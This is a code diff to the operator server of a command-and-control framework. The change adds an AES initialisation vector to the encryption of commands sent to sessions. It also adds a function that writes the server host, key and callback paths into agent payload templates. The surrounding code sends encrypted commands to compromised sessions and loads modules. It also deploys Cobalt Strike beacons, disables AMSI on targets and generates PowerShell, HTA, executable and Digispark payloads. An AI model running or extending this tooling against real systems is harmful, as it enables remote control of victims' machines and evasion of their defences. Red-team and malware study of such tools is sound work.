@@ -22,8 +22,13 @@ listener_id = 0
 connections_information = {}
 listeners_information = {}
 commands = {}
+
+
 key = "".join([random.choice(string.ascii_uppercase) for i in range(32)])
-aes_encryption_key = base64.b64encode(bytearray(key, "UTF-8")).decode()
+iv = "".join([random.choice(string.ascii_uppercase) for i in range(AES.block_size)])
+
+aes_key = base64.b64encode(bytearray(key, "UTF-8")).decode()
+aes_iv = base64.b64encode(bytearray(iv, "UTF-8")).decode()
 
 oct_commands = ["help", "exit", "interact", "list", "listeners", "listen_http", "listen_https", "delete", "generate_powershell", "generate_unmanaged_exe","generate_hta", "generate_digispark", "delete_listener"]
 
@@ -95,7 +100,7 @@ def completer_interact(text, state):
         return None
 
 def send_command(session, command):
-    encrypted_command = encrypt_command(aes_encryption_key, command)
+    encrypted_command = encrypt_command(aes_key, aes_iv, command)
     commands[session] = encrypted_command
     print("[+] Command sent , waiting for results")
 
@@ -136,7 +141,7 @@ def load_module(session, module_name):
 		fi = open(module, "r")
 		module_content = fi.read()
 		# encrypt module before send it
-		base64_command = encrypt_command(aes_encryption_key, module_content)
+		base64_command = encrypt_command(aes_key, aes_iv, module_content)
 		commands[session] = base64_command
 		print((colored("[+] Module should be loaded !", "green")))
 	else:
@@ -146,7 +151,7 @@ def load_beacon(session, beacon_path):
 	fi = open(beacon_path, "r")
 	module_content = fi.read()
 	# encrypt module before send it
-	base64_command = encrypt_command(aes_encryption_key, module_content)
+	base64_command = encrypt_command(aes_key, aes_iv, module_content)
 	commands[session] = base64_command
 
 def deploy_cobalt_beacon(session, beacon_path):
@@ -169,7 +174,7 @@ def disable_amsi(session):
 	if os.path.isfile(amsi_module):
 		fi = open(amsi_module, "r")
 		module_content = fi.read()
-		base64_command = encrypt_command(aes_encryption_key, module_content)
+		base64_command = encrypt_command(aes_key, aes_iv, module_content)
 		commands[session] = base64_command
 		print((colored("AMSI disable module has been loaded !", "green")))
 
@@ -287,6 +292,23 @@ def interact_help():
 	print("disable_amsi \t\t\tdisable AMSI on the target machine")
 	print("report \t\t\t\tget situation report from the target")
 	print("\n")
+
+
+def replace_agent_config_vars(template_str, server_http_protocol, server_hostname, task_check_interval):
+    command_host_url = command_send_url.split("/")[1]
+    pcode = template_str.replace("OCU_INTERVAL", str(task_check_interval))
+    pcode = pcode.replace("OCT_KEY", str(aes_key))
+    pcode = pcode.replace("OCT_IV", str(aes_iv))
+    pcode = pcode.replace("OCT_first_ping", first_ping_url.split("/")[1])
+    pcode = pcode.replace("OCT_command", command_host_url)
+    pcode = pcode.replace("OCT_report", report_url.split("/")[1])
+    pcode = pcode.replace("OCT_file_receiver", file_receiver_url.split("/")[1])
+    pcode = pcode.replace("OCTRECV", command_receiver_url.split("/")[1])
+    pcode = pcode.replace("OCU_PROTO", server_http_protocol)
+    pcode = pcode.replace("SRVHOST", server_hostname)
+    pcode = pcode.replace("OCT_AKILL", str(auto_kill))
+    return pcode
+
 
 def banner():
 	# \033[94m
